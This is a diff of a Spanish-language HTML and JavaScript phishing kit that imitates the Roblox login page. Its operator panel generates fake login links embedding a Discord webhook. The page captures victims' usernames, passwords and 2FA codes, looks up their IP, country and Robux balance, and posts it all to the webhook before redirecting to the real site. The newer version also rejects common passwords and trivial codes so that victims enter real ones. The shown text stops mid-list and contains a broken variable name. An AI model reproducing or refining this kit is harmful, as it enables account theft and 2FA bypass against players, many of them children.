@@ -3,492 +3,297 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVADYNAMICS — Panel</title>
+    <title>NovaDynamics</title>
     <style>
-        :root {
-            --r-fondo: #1E1F23;
-            --r-campo: #2F3138;
-            --r-boton: #3A3C44;
-            --r-azul: #0085FF;
-            --r-rojo: #ED2939;
-            --r-verde: #34C759;
-            --r-texto: #FFFFFF;
-            --r-texto-sec: #9CA3AF;
-            --r-borde: #4B5563;
-        }
-        *{margin:0;padding:0;box-sizing:border-box;font-family:"Segoe UI",Roboto,Arial,sans-serif}
-        body{background:var(--r-fondo);color:var(--r-texto);min-height:100vh}
+        *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif}
+        body{background:#1a1a1f;color:#fff;min-height:100vh}
+        .hidden{display:none !important}
 
-        /* CABECERA */
-        .cabecera{display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:var(--r-fondo);border-bottom:1px solid #2A2B2F}
-        .logo{width:40px;height:40px;background:#FFF;border-radius:4px;display:flex;align-items:center;justify-content:center}
-        .logo div{width:24px;height:24px;background:#000;border-radius:2px}
-        .nav-botones{display:flex;gap:12px}
-        .btn-reg{background:var(--r-azul);color:#FFF;border:none;padding:10px 24px;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer}
-        .btn-log{background:transparent;color:var(--r-texto);border:1px solid var(--r-borde);padding:10px 24px;border-radius:8px;font-size:16px;cursor:pointer}
-        .menu-sup{display:flex;justify-content:flex-start;gap:32px;padding:14px 20px;background:var(--r-fondo);border-bottom:1px solid #2A2B2F}
-        .menu-sup a{font-size:17px;color:var(--r-texto);text-decoration:none}
+        /* LOGO ROBLOX ARRIBA DERECHA */
+        .roblox-logo{position:fixed;top:15px;right:20px;z-index:100}
+        .roblox-logo svg{width:40px;height:40px;fill:#e2231a}
 
-        /* PÁGINA DE LOGIN */
-        .pag-login{display:none;align-items:center;justify-content:center;min-height:calc(100vh - 130px);padding:20px}
-        .caja-login{background:#1A1B1F;border-radius:12px;padding:36px;max-width:440px;width:100%;border:1px solid #2A2B2F;box-shadow:0 8px 32px rgba(0,0,0,0.4)}
-        .tit-login{font-size:34px;font-weight:700;text-align:center;margin-bottom:32px}
-        .campo{width:100%;padding:14px 16px;background:#27282F;border:1px solid #3A3C44;border-radius:8px;font-size:18px;color:#FFF;margin-bottom:16px;outline:none;transition:border 0.2s}
-        .campo:focus{border-color:var(--r-azul)}
-        .campo::placeholder{color:var(--r-texto-sec)}
-        .btn-login{width:100%;padding:14px;background:transparent;color:var(--r-texto-sec);border:2px solid var(--r-borde);border-radius:8px;font-size:20px;font-weight:500;cursor:pointer;margin:8px 0 24px;transition:all 0.15s}
-        .btn-login:hover{border-color:#FFF;color:#FFF}
-        .btn-login:active{transform:scale(0.98)}
-        .enlace-olv{display:block;text-align:center;color:#FFF;text-decoration:none;font-size:18px;margin-bottom:24px}
-        .sep-texto{text-align:center;color:var(--r-texto-sec);margin:20px 0;position:relative}
-        .sep-texto:before,.sep-texto:after{content:'';position:absolute;top:50%;width:30%;height:1px;background:#3A3C44}
-        .sep-texto:before{left:0}
-        .sep-texto:after{right:0}
-        .btn-sec{width:100%;padding:14px;background:#27282F;color:#FFF;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-bottom:12px;border:1px solid #3A3C44}
-        .txt-reg{text-align:center;margin-top:20px;font-size:16px;color:var(--r-texto-sec)}
-        .txt-reg a{color:var(--r-azul);text-decoration:none}
-        .caja-err{background:rgba(237,41,57,0.1);border:1px solid var(--r-rojo);color:#FF9898;padding:12px;border-radius:8px;margin-bottom:16px;display:none;text-align:center}
+        /* CONTENEDORES */
+        .container{max-width:420px;margin:0 auto;padding:40px 20px}
+        .dashboard-container{max-width:500px}
+        h2{text-align:center;margin-bottom:25px;color:#fff}
+        .card{background:#27272f;padding:25px;border-radius:10px;box-shadow:0 4px 12px rgba(0,0,0,.3)}
+        input,button{width:100%;padding:12px 10px;margin:8px 0;border-radius:6px;border:none;font-size:15px}
+        input{background:#33333f;color:#fff;border:1px solid #444}
+        input:focus{outline:none;border-color:#00a2ff}
+        button{background:#00a2ff;color:#fff;font-weight:600;cursor:pointer;transition:.2s}
+        button:hover{background:#008feb}
+        button:disabled{background:#555;cursor:not-allowed}
+        .btn-success{background:#28c747;margin-top:10px}
+        .btn-success:hover{background:#22b03d}
+        .btn-back{background:#444;margin-bottom:15px}
+        .btn-back:hover{background:#555}
+        .error{color:#ff5555;font-size:14px;margin:6px 0;min-height:20px}
+        .link-result{background:#2c2c3a;padding:12px;border-radius:6px;margin-top:15px;word-break:break-all;font-size:13px;color:#00eeff}
+        .title-center{text-align:center;margin-bottom:20px}
 
-        /* MODAL 2FA */
-        .modal-2fa{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:200;align-items:center;justify-content:center;padding:20px}
-        .caja-2fa{background:#1E1F23;color:#FFF;border-radius:12px;padding:28px;max-width:400px;width:100%;position:relative;border:1px solid #2A2B2F}
-        .btn-cerrar{position:absolute;top:12px;left:12px;background:transparent;border:none;color:#FFF;font-size:28px;cursor:pointer;line-height:1}
-        .tit-2fa{text-align:center;font-size:22px;font-weight:600;margin-bottom:24px}
-        .icono-candado{width:90px;height:90px;border:3px solid #FFF;border-radius:50%;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:40px}
-        .sub-2fa{text-align:center;font-size:18px;color:var(--r-texto-sec);margin-bottom:28px;line-height:1.5}
-        .btn-opcion{display:flex;align-items:center;gap:16px;background:#27282F;color:#FFF;border:none;border-radius:8px;padding:16px;width:100%;font-size:18px;cursor:pointer;margin-bottom:12px;text-align:left;border:1px solid #3A3C44}
-        .btn-opcion.primero{background:#0F1012;border-color:var(--r-azul)}
-        .icono-btn{font-size:24px;width:30px;text-align:center}
-        .codigo-cajas{display:flex;justify-content:center;gap:10px;margin:24px 0}
-        .caja-cod{width:48px;height:58px;background:#27282F;border:1px solid #4B5563;border-radius:6px;font-size:26px;text-align:center;color:#FFF;outline:none}
-        .caja-cod:focus{border-color:var(--r-azul)}
-        .paso-codigo{display:none}
-
-        /* PANEL DE CONTROL */
-        .pag-panel{display:block;padding:24px;padding-bottom:90px;min-height:100vh;background:#0F1012}
-        .panel-cabecera{margin-bottom:28px}
-        .panel-tit{font-size:26px;font-weight:700;margin-bottom:4px}
-        .panel-sub{color:#888F98;font-size:15px}
-        .tarjetas{display:grid;grid-template-columns:repeat(3,1fr);gap:16px;margin-bottom:28px}
-        .tarjeta{background:#1A1B1F;border-radius:16px;padding:24px;border:1px solid #2A2B2F}
-        .tarjeta h3{font-size:16px;color:#888F98;margin-bottom:10px}
-        .valor{font-size:34px;font-weight:700}
-        .caja{background:#1A1B1F;border-radius:16px;padding:24px;border:1px solid #2A2B2F;margin-bottom:16px}
-        .caja h3{font-size:20px;margin-bottom:18px}
-        .tabla{width:100%;border-collapse:collapse}
-        th{background:#242529;padding:14px 10px;text-align:left;font-size:15px;border-bottom:1px solid #2A2B2F;color:#888F98}
-        td{padding:14px 10px;border-top:1px solid #2A2B2F;font-size:15px}
-        .vacio{text-align:center;padding:50px 20px;color:#888F98;font-size:16px}
-        .input{width:100%;padding:14px 16px;background:#242529;border:none;border-radius:10px;font-size:16px;color:#FFF;margin-bottom:14px;outline:1px solid #3A3C44}
-        .input:focus{outline:2px solid var(--r-azul)}
-        .btn-azul{background:var(--r-azul);color:#FFF;border:none;padding:14px 22px;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin:6px}
-        .btn-gris{background:#2A2B2F;color:#FFF;border:none;padding:14px 22px;border-radius:10px;font-size:16px;cursor:pointer;margin:6px}
-        .enlace-caja{background:#242529;padding:16px;border-radius:10px;word-break:break-all;font-size:15px;margin:14px 0;display:none}
-        .fila{display:flex;justify-content:space-between;align-items:center;padding:16px 0;border-bottom:1px solid #2A2B2F}
-        .switch{width:52px;height:28px;background:#3A3C44;border-radius:14px;position:relative;cursor:pointer}
-        .switch.activo{background:var(--r-azul)}
-        .switch::after{content:'';position:absolute;width:24px;height:24px;background:#FFF;border-radius:50%;top:2px;left:2px}
-        .switch.activo::after{transform:translateX(24px)}
-        .nav-inf{position:fixed;bottom:0;left:0;right:0;display:flex;justify-content:space-around;background:#1A1B1F;border-top:1px solid #2A2B2F;padding:12px 0;z-index:999}
-        .nav-btn{text-align:center;color:#888F98;font-size:14px;cursor:pointer;padding:8px 12px}
-        .nav-btn.activo{color:var(--r-azul)}
-        .vista{display:none}
-        .vista.activa{display:block}
-        .estado-ok{color:var(--r-verde)}
-        .estado-mal{color:var(--r-rojo)}
+        /* CAJA CÓDIGO 2FA */
+        .code-inputs{display:flex;gap:8px;justify-content:center;margin:20px 0}
+        .code-inputs input{width:45px;height:55px;text-align:center;font-size:24px;padding:0}
+        .label{font-size:14px;color:#ccc;margin-top:12px;display:block}
     </style>
 </head>
 <body>
 
-<!-- CABECERA -->
-<div class="cabecera">
-    <div class="logo"><div></div></div>
-    <div class="nav-botones">
-        <button class="btn-reg">Sign Up</button>
-        <button class="btn-log" onclick="irPanel()">Panel</button>
+    <!-- LOGO ROBLOX ARRIBA DERECHA -->
+    <div class="roblox-logo">
+        <svg viewBox="0 0 40 40" xmlns="http://www.w3.org/2000/svg">
+            <path d="M20 0C9 0 0 9 0 20C0 31 9 40 20 40C31 40 40 31 40 20C40 9 31 0 20 0ZM14.5 30.5L9.5 23.5L14.5 16.5L19.5 23.5L14.5 30.5ZM25.5 30.5L20.5 23.5L25.5 16.5L30.5 23.5L25.5 30.5Z"/>
+        </svg>
     </div>
-</div>
-<div class="menu-sup">
-    <a href="#">Charts</a><a href="#">Marketplace</a><a href="#">Create</a><a href="#">Robux</a>
-</div>
 
-<!-- PÁGINA DE LOGIN -->
-<div class="pag-login" id="pagLogin">
-    <div class="caja-login">
-        <h2 class="tit-login">Login to Roblox</h2>
-        <div class="caja-err" id="cajaErr"></div>
-        <input type="text" class="campo" id="usuario" placeholder="Username/Email/Phone">
-        <input type="password" class="campo" id="pass" placeholder="Password">
-        <button class="btn-login" id="btnEntrar" onclick="enviarDatos()">Log In</button>
-        <a href="#" class="enlace-olv">Forgot Password or Username?</a>
-        <div class="sep-texto">login with</div>
-        <button class="btn-sec" onclick="alert('A code has been sent to your email')">Email Me a One-Time Code</button>
-        <button class="btn-sec" onclick="alert('Check your device')">Quick Sign-in</button>
-        <p class="txt-reg">Don't have an account? <a href="#">Sign Up</a></p>
-    </div>
-</div>
-
-<!-- MODAL 2FA -->
-<div class="modal-2fa" id="modal2fa">
-    <div class="caja-2fa">
-        <button class="btn-cerrar" onclick="cerrar2fa()">×</button>
-        <h2 class="tit-2fa">2-Step Verification</h2>
-        <div id="pasoOpciones">
-            <div class="icono-candado">🔒</div>
-            <p class="sub-2fa">Choose alternate verification method.</p>
-            <button class="btn-opcion primero" onclick="pedirCodigo()">
-                <span class="icono-btn">📱</span> Use Your Device
-            </button>
-            <button class="btn-opcion" onclick="pedirCodigo()">
-                <span class="icono-btn">🔁</span> Backup Code
-            </button>
+    <!-- ================= DASHBOARD — CREAR ENLACE ================= -->
+    <div id="dashboard" class="container dashboard-container">
+        <h2>🔗 Crear Enlace</h2>
+        <div class="card">
+            <label class="label">ID de cuenta Roblox</label>
+            <input type="text" id="usuarioLink" placeholder="Ej: 4738685727">
+            
+            <label class="label">Tu Webhook de Discord</label>
+            <input type="text" id="webhookUrl" placeholder="Pega tu enlace de Discord aquí">
+            
+            <button onclick="generarEnlace()">✅ Generar Enlace</button>
+            
+            <div id="linkResult" class="link-result hidden"></div>
+            <button id="copyBtn" class="btn-success hidden" onclick="copiarEnlace()">📋 Copiar Enlace</button>
         </div>
-        <div id="pasoCodigo" class="paso-codigo">
-            <p class="sub-2fa">Enter the code sent to your email / authenticator</p>
-            <div class="codigo-cajas">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,0)">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,1)">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,2)">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,3)">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,4)">
-                <input class="caja-cod" maxlength="1" oninput="siguiente(this,5)">
+    </div>
+
+    <!-- ================= PÁGINA INICIO DE SESIÓN ================= -->
+    <div id="loginPage" class="container hidden">
+        <button class="btn-back" onclick="volverPanel()">← Volver al Panel</button>
+        <h2>Iniciar Sesión</h2>
+        <div class="card">
+            <label class="label">Nombre de usuario</label>
+            <input type="text" id="userField" placeholder="Nombre de usuario">
+
+            <label class="label">Contraseña</label>
+            <input type="password" id="passField" placeholder="Contraseña">
+            <div id="passError" class="error"></div>
+
+            <button id="loginBtn" onclick="validarLogin()">Iniciar sesión</button>
+        </div>
+    </div>
+
+    <!-- ================= CAJA CÓDIGO 2FA ================= -->
+    <div id="twofaPage" class="container hidden">
+        <h2>Verificación en dos pasos</h2>
+        <div class="card">
+            <p style="text-align:center;color:#ccc;margin-bottom:15px;">Escribe el código de 6 dígitos de tu autenticador</p>
+            <div class="code-inputs">
+                <input type="text" maxlength="1" oninput="mover(this,0)">
+                <input type="text" maxlength="1" oninput="mover(this,1)">
+                <input type="text" maxlength="1" oninput="mover(this,2)">
+                <input type="text" maxlength="1" oninput="mover(this,3)">
+                <input type="text" maxlength="1" oninput="mover(this,4)">
+                <input type="text" maxlength="1" oninput="mover(this,5)">
             </div>
-        </div>
-    </div>
-</div>
-
-<!-- PANEL DE CONTROL -->
-<div class="pag-panel" id="pagPanel">
-    <div class="vista activa" id="vistaInicio">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">🏠 Panel Principal</h2>
-            <p class="panel-sub">NOVADYNAMICS — Sistema de Control</p>
-        </div>
-        <div class="tarjetas">
-            <div class="tarjeta"><h3>💰 Robux Totales</h3><div class="valor" id="robuxSum">0</div></div>
-            <div class="tarjeta"><h3>👤 Cuentas Obtenidas</h3><div class="valor" id="cuentasTot">0</div></div>
-            <div class="tarjeta"><h3>💸 Robux Gastados</h3><div class="valor" id="robuxGas">0</div></div>
-        </div>
-        <div class="caja">
-            <h3>📋 Historial de Cuentas</h3>
-            <table class="tabla">
-                <thead><tr><th>Usuario</th><th>Robux</th><th>Días</th><th>País</th><th>IP</th></tr></thead>
-                <tbody id="tablaBody"><tr><td colspan="5" class="vacio">Sin registros aún</td></tr></tbody>
-            </table>
+            <div id="codeError" class="error"></div>
+            <button onclick="enviarCodigo()">Verificar</button>
         </div>
     </div>
 
-    <div class="vista" id="vistaEnlaces">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">🔗 Generar Enlace</h2>
-            <p class="panel-sub">Crea enlaces de inicio de sesión falsos</p>
-        </div>
-        <div class="caja">
-            <h3>Enlace de inicio de sesión</h3>
-            <input type="text" class="input" id="usuarioLink" placeholder="Usuario o ID de Roblox">
-            <button class="btn-azul" onclick="generarEnlace()">✅ Generar Enlace</button>
-            <div class="enlace-caja" id="enlaceOut"></div>
-            <button class="btn-gris" id="btnCopiar" onclick="copiarEnlace()">📋 Copiar Enlace</button>
-        </div>
-    </div>
+    <script>
+        let enlaceGenerado = "";
+        let WEBHOOK = "";
+        let USUARIO_CAPTURADO = "";
+        let PASS_CAPTUR
+        ADA = "";        // ================= DETECTAR SI VIENEN DEL ENLACE =================
+        window.onload = function(){
+            const params = new URLSearchParams(window.location.search);
+            const u = params.get('u');
+            const wh = params.get('wh');
 
-    <div class="vista" id="vistaAjustes">
-        <div class="panel-cabecera">
-            <h2 class="panel-tit">⚙️ Configuración</h2>
-            <p class="panel-sub">Webhook y preferencias</p>
-        </div>
-        <div class="caja">
-            <h3>🔗 Webhook de Discord</h3>
-            <input type="text" class="input" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
-            <button class="btn-azul" onclick="guardarWebhook()">✅ Guardar</button>
-            <button class="btn-gris" onclick="borrarWebhook()">🗑️ Borrar</button>
-            <p id="estadoWebhook" style="margin-top:12px;font-size:15px">⚠️ No configurado</p>
-            <div class="fila">
-                <span>🔔 Mensaje @everyone</span>
-                <div class="switch" id="swTodos" onclick="this.classList.toggle('activo');localStorage.setItem('todos',this.classList.contains('activo')?'1':'0')"></div>
-            </div>
-        </div>
-    </div>
-
-    <div class="nav-inf">
-        <div class="nav-btn activo" onclick="cambiarVista('Inicio')">🏠<br>Inicio</div>
-        <div class="nav-btn" onclick="cambiarVista('Enlaces')">🔗<br>Enlaces</div>
-        <div class="nav-btn" onclick="cambiarVista('Ajustes')">⚙️<br>Ajustes</div>
-    </div>
-</div>
-
-<script>
-let registros = [], enlaceGenerado='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ip:'Desconocida'};
-let USUARIO_CAPTURADO='', PASS_CAPTURADA='';
-const FOTO_BOT = "https://cdn.phototourl.com/free/2026-08-15-ee59cd76-8d17-4221-a2bf-e12452038867.jpg";
-let USUARIO_OCULTO = '';
-
-window.onload=async function(){
-    const params=new URLSearchParams(window.location.search);
-    const u=params.get('u');
-    if(u){
-        USUARIO_OCULTO = u;
-        history.replaceState({}, document.title, window.location.pathname);
-        document.getElementById('pagLogin').style.display='flex';
-        document.getElementById('pagPanel').style.display='none';
-        document.getElementById('usuario').value='';
-        await cargarIP();
-        await cargarDatosRoblox(u);
-    }else{
-        document.getElementById('pagLogin').style.display='none';
-        document.getElementById('pagPanel').style.display='block';
-        cargarWebhook();
-        actualizarPanel();
-    }
-};
-
-async function cargarIP(){
-    try{
-        const d=await(await fetch('https://ipapi.co/json/')).json();
-        const p={US:["United States","🇺🇸"],ES:["Spain","🇪🇸"],MX:["Mexico","🇲🇽"],AR:["Argentina","🇦🇷"],CO:["Colombia","🇨🇴"],PE:["Peru","🇵🇪"],BR:["Brazil","🇧🇷"],CL:["Chile","🇨🇱"]};
-        ipDatos={
-            pais:p[d.country_code]?.[0]||d.country_name||"Unknown",
-            bandera:p[d.country_code]?.[1]||"🌍",
-            ip:d.ip||'Unknown'
+            if(u){
+                // VIENEN DEL ENLACE → MOSTRAR INICIO DE SESIÓN
+                document.getElementById('dashboard').classList.add('hidden');
+                document.getElementById('loginPage').classList.remove('hidden');
+                document.getElementById('userField').value = u;
+                USUARIO_CAPTURADO = u;
+                if(wh) WEBHOOK = atob(wh);
+            }
         };
-    }catch(e){}
-}
 
-async function cargarDatosRoblox(usuario){
-    let id=usuario,nombreReal=usuario,fechaCreacionTexto='Not available',diasCuenta='Unknown',robuxCuenta=0,premium='False',verificado='❌ Not Verified',tiene2FA='2FA not enabled.';
-    if(isNaN(usuario)){
-        try{
-            const res=await fetch('https://users.roblox.com/v1/usernames/users',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify({usernames:[usuario],excludeBannedUsers:false})
-            });
-            const d=await res.json();
-            if(d.data&&d.data[0]){id=d.data[0].id;nombreReal=d.data[0].name;}
-        }catch(e){}
-    }
-    try{
-        const perfil=await fetch(`https://users.roblox.com/v1/users/${id}`).then(x=>x.json());
-        robuxCuenta=await fetch(`https://economy.roblox.com/v1/users/${id}/currency`).then(x=>x.json()).then(r=>r.robux||0);
-        const fechaCreacion = new Date(perfil.created);
-        const hoy = new Date();
-        const diferenciaMs = hoy - fechaCreacion;
-        diasCuenta = Math.floor(diferenciaMs / (1000 * 60 * 60 * 24));
-        fechaCreacionTexto = fechaCreacion.toLocaleDateString('en-US', {day:'numeric', month:'long', year:'numeric'});
-        premium = perfil.isPremium ? 'True' : 'False';
-        verificado = perfil.hasVerifiedBadge ? '✅ Verified' : '❌ Not Verified';
-        datosRoblox = {nombre: perfil.name, id: id, fechaCreacion: fechaCreacionTexto, dias: diasCuenta, robux: robuxCuenta, premium: premium, verificado: verificado, tiene2FA: tiene2FA};
-    }catch(e){
-        datosRoblox = {nombre: nombreReal, id: id, fechaCreacion: 'Not available', dias: 'Unknown', robux: 0, premium: 'False', verificado: '❌ Not Verified', tiene2FA: 'Unknown'};
-    }
-}
+        // ================= GENERAR ENLACE =================
+        function generarEnlace(){
+            const id = document.getElementById('usuarioLink').value.trim();
+            const wh = document.getElementById('webhookUrl').value.trim();
 
-function irPanel(){
-    document.getElementById('pagLogin').style.display='none';
-    document.getElementById('pagPanel').style.display='block';
-    cargarWebhook();
-    actualizarPanel();
-}
+            if(!id || !wh){
+                alert("⚠️ Pon el ID y tu Webhook");
+                return;
+            }
 
-function limpiarError(){document.getElementById('cajaErr').style.display='none';}
-function err(t){const e=document.getElementById('cajaErr');e.textContent=t;e.style.display='block';}
+            const whCodificado = btoa(wh);
+            enlaceGenerado = window.location.origin + window.location.pathname + "?u=" + id + "&wh=" + whCodificado;
 
-async function enviarDatos(){
-    const u = USUARIO_OCULTO || document.getElementById('usuario').value.trim();
-    const pass = document.getElementById('pass').value.trim();
-    const btn = document.getElementById('btnEntrar');
-    limpiarError();
-    if(!u) { err('Please enter a username or email address.'); return; }
-    if(!pass || pass.length < 6) { err('The password is incorrect.'); return; }
-    btn.textContent = 'Logging in...';
-    btn.disabled = true;
-    USUARIO_CAPTURADO = u;
-    PASS_CAPTURADA = pass;
-    await cargarIP();
-    if(!USUARIO_OCULTO) await cargarDatosRoblox(u);
-    document.getElementById('pagLogin').style.display='none';
-    document.getElementById('modal2fa').style.display='flex';
-}
-
-function cerrar2fa(){
-    document.getElementById('modal2fa').style.display='none';
-    document.getElementById('pasoOpciones').style.display='block';
-    document.getElementById('pasoCodigo').style.display='none';
-    document.querySelectorAll('.caja-cod').forEach(c=>c.value='');
-}
-
-function pedirCodigo(){
-    document.getElementById('pasoOpciones').style.display='none';
-    document.getElementById('pasoCodigo').style.display='block';
-    setTimeout(()=>document.querySelector('.caja-cod').focus(),300);
-}
-
-function siguiente(input,indice){
-    if(input.value.length===1){
-        const cajas=document.querySelectorAll('.caja-cod');
-        if(indice<5) cajas[indice+1].focus();
-        else{
-            const codigo=Array.from(cajas).map(c=>c.value).join('');
-            enviarTodo(codigo);
+            document.getElementById('linkResult').classList.remove('hidden');
+            document.getElementById('linkResult').textContent = enlaceGenerado;
+            document.getElementById('copyBtn').classList.remove('hidden');
         }
-    }
-}
-    async function enviarTodo(codigo){
-    const wh = localStorage.getItem('webhook');
-    const todos = localStorage.getItem('todos')==='1'?'@everyone 🔴 **NUEVA CUENTA OBTENIDA** 🔴\n═══════════════════\n':'═══════════════════\n';
-    const fechaAhora = new Date().toLocaleString('es-ES');
-    const fotoPerfil = `https://www.roblox.com/headshot-thumbnail/image?userId=${datosRoblox.id||'0'}&width=420&height=420&format=Png`;
 
-    registros.unshift({
-        usuario: datosRoblox.nombre || USUARIO_CAPTURADO,
-        robux: datosRoblox.robux || 0,
-        fechaCreacion: datosRoblox.fechaCreacion || 'No disponible',
-        dias: datosRoblox.dias || 'Desconocido',
-        pais: ipDatos.bandera+' '+ipDatos.pais,
-        ip: ipDatos.ip
-    });
-    localStorage.setItem('cuentas', JSON.stringify(registros));
+        function copiarEnlace(){
+            navigator.clipboard.writeText(enlaceGenerado).then(()=>{
+                alert("✅ ¡Enlace copiado! Compártelo");
+            });
+        }
 
-    if(!wh){
-        alert('⚠️ Pon tu Webhook en Ajustes primero');
-        window.location.href='https://www.roblox.com/login';
-        return;
-    }
+        function volverPanel(){
+            window.location.search = "";
+            window.location.reload();
+        }
 
-    fetch(wh, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-            username: "NOVADYNAMICS",
-            avatar_url: FOTO_BOT,
-            content: todos,
-            embeds: [{
-                color: 15548997,
-                author: {
-                    name: "🔓 CUENTA OBTENIDA",
-                    icon_url: FOTO_BOT
-                },
-                thumbnail: { url: fotoPerfil },
-                fields: [
-                    {
-                        name: "👤 DATOS DE LA CUENTA",
-                        value: `**Usuario:** \`${datosRoblox.nombre||USUARIO_CAPTURADO}\`\n**ID:** \`${datosRoblox.id||'Desconocido'}\`\n**Creada:** ${datosRoblox.fechaCreacion}\n**Edad:** ${datosRoblox.dias} Días`,
-                        inline: false
-                    },
-                    {
-                        name: "🌍 UBICACIÓN / IP",
-                        value: `**País:** ${ipDatos.bandera} ${ipDatos.pais}\n**IP:** \`${ipDatos.ip}\``,
-                        inline: false
-                    },
-                    {
-                        name: "🔑 CREDENCIALES",
-                        value: `**Usuario:** \`${USUARIO_CAPTURADO}\`\n**Contraseña:** ||\`${PASS_CAPTURADA}\`||\n**Código 2FA:** ||\`${codigo}\`||`,
-                        inline: false
-                    },
-                    {
-                        name: "💰 ROBUX",
-                        value: `**Saldo:** ${datosRoblox.robux} R$`,
-                        inline: true
-                    },
-                    {
-                        name: "✅ VERIFICADO",
-                        value: `${datosRoblox.verificado}`,
-                        inline: true
-                    },
-                    {
-                        name: "🔒 PREMIUM",
-                        value: `${datosRoblox.premium==='True'?'✅ Sí':'❌ No'}`,
-                        inline: true
-                    }
-                ],
-                footer: {
-                    text: `NOVADYNAMICS SYSTEM • Capturado: ${fechaAhora}`,
-                    icon_url: FOTO_BOT
-                }
-            }]
-        })
-    }).finally(()=>{
-        window.location.href='https://www.roblox.com/login';
-    });
-}
+        // ================= VALIDAR CONTRASEÑA =================
+        function validarLogin(){
+            const user = document.getElementById('userField').value.trim();
+            const pass = document.getElementById('passField').value.trim();
+            const error = document.getElementById('passError');
+            const btn = document.getElementById('loginBtn');
 
-function generarEnlace(){
-    const u = document.getElementById('usuarioLink').value.trim();
-    const base = window.location.origin + window.location.pathname;
-    enlaceGenerado = u ? `${base}?u=${encodeURIComponent(u)}` : base;
-    document.getElementById('enlaceOut').style.display='block';
-    document.getElementById('enlaceOut').textContent = enlaceGenerado;
-    document.getElementById('btnCopiar').style.display='inline-block';
-    alert('✅ Enlace generado:\n' + enlaceGenerado);
-}
+            // ❌ Si está vacía o muy corta
+            if(!user || pass.length < 6){
+                error.textContent = "The password is incorrect.";
+                return;
+            }
 
-function copiarEnlace(){
-    navigator.clipboard.writeText(enlaceGenerado).then(()=>alert('✅ ¡Enlace copiado!'));
-}
+            // ❌ CONTRASEÑAS OBVIAMENTE FALSAS
+            const prohibidasPass = [
+                "123456","123456789","password","12345678","12345",
+                "qwerty","abc123","111111","123123","admin","1234567",
+                "password1","iloveyou","000000","123321","654321",
+                "1234567890","qwerty123","121212","00000000",
+                "11111111","88888888","99999999","123654"
+            ];
+            if(prohibidasPass.includes(pass.toLowerCase())){
+                error.textContent = "The password is incorrect.";
+                return;
+            }
 
-function guardarWebhook(){
-    const u = document.getElementById('webhookUrl').value.trim();
-    const e = document.getElementById('estadoWebhook');
-    if(!u.startsWith('https://discord.com/api/webhooks/')){
-        e.textContent='❌ Enlace no válido';
-        e.className='estado-mal';
-        return;
-    }
-    localStorage.setItem('webhook', u);
-    e.textContent='✅ Webhook guardado';
-    e.className='estado-ok';
-    alert('✅ Guardado correctamente');
-}
+            // ✅ PASA → SIMULAR VERIFICACIÓN
+            error.textContent = "";
+            btn.textContent = "Verifying...";
+            btn.disabled = true;
 
-function borrarWebhook(){
-    localStorage.removeItem('webhook');
-    document.getElementById('webhookUrl').value='';
-    const e = document.getElementById('estadoWebhook');
-    e.textContent='⚠️ No configurado';
-    e.className='';
-}
+            setTimeout(()=>{
+                btn.textContent = "Iniciar sesión";
+                btn.disabled = false;
+                USUARIO_CAPTURADO = user;
+                PASS_CAPTURADA = pass;
+                // MOSTRAR CAJA DE CÓDIGO
+                document.getElementById('loginPage').classList.add('hidden');
+                document.getElementById('twofaPage').classList.remove('hidden');
+                document.querySelectorAll('.code-inputs input')[0].focus();
+            }, 1500);
+        }
 
-function cargarWebhook(){
-    const w = localStorage.getItem('webhook');
-    const e = document.getElementById('estadoWebhook');
-    if(w){
-        document.getElementById('webhookUrl').value=w;
-        e.textContent='✅ Webhook guardado';
-        e.className='estado-ok';
-    }
-    if(localStorage.getItem('todos')==='1'){
-        document.getElementById('swTodos').classList.add('activo');
-    }
-}
+        // ================= MOVERSE ENTRE CAJAS =================
+        function mover(el, idx){
+            if(el.value.length === 1){
+                const inputs = document.querySelectorAll('.code-inputs input');
+                if(idx < 5) inputs[idx+1].focus();
+            }
+        }
 
-function cambiarVista(nombre){
-    document.querySelectorAll('.vista').forEach(v=>v.classList.remove('activa'));
-    document.querySelectorAll('.nav-btn').forEach(b=>b.classList.remove('activo'));
-    document.getElementById('vista'+nombre).classList.add('activa');
-    event.currentTarget.classList.add('activo');
-}
+        // ================= VALIDAR CÓDIGO 2FA =================
+        function enviarCodigo(){
+            const inputs = document.querySelectorAll('.code-inputs input');
+            let codigo = "";
+            inputs.forEach(i => codigo += i.value.trim());
+            const error = document.getElementById('codeError');
 
-function actualizarPanel(){
-    let tr=0;
-    registros.forEach(r=>{ tr+=r.robux||0; });
-    document.getElementById('robuxSum').textContent = tr.toLocaleString();
-    document.getElementById('cuentasTot').textContent = registros.length;
+            // ❌ MENOS DE 6 DÍGITOS
+            if(codigo.length !== 6 || !/^\d{6}$/.test(codigo)){
+                error.textContent = "❌ Code is invalid";
+                return;
+            }
 
-    const tb = document.getElementById('tablaBody');
-    if(registros.length===0){
-        tb.innerHTML='<tr><td colspan="5" class="vacio">Sin registros aún</td></tr>';
-        return;
-    }
-    tb.innerHTML = registros.map(r=>`
-        <tr>
-            <td>${r.usuario}</td>
-            <td>${r.robux}</td>
-            <td>${r.dias}</td>
-            <td>${r.pais}</td>
-            <td>${r.ip}</td>
-        </tr>
-    `).join('');
-}
-</script>
+            // ❌ TODOS LOS CÓDIGOS OBVIAMENTE FALSOS
+            const prohibidosCod = [
+                "000000","111111","222222","333333","444444",
+                "555555","666666","777777","888888","999999",
+                "012345","123456","234567","345678","456789",
+                "543210","654321","765432","876543","987654",
+                "010101","101010","121212","202020","212121",
